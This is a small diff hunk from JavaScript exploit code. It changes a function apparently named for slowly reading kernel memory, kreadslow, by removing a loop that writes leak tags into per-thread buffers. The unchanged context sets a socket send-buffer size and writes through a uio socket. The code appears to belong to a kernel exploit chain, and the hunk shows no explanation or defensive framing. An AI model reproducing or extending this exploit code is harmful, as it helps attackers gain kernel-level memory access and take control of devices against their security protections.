@@ -1508,10 +1508,6 @@ function kreadslow(addr, size) {
     }
   }
 
-  for (let i = 0; i < UIO_THREAD_NUM; i++) {
-      write64(leak_buffers[i], LEAK_TAG);
-  }
-
   write32(sockopt_val_buf, size);
   setsockopt(new BigInt(uio_sock_1), SOL_SOCKET, SO_SNDBUF, sockopt_val_buf, 4);
   write(new BigInt(uio_sock_1), tmp, size);
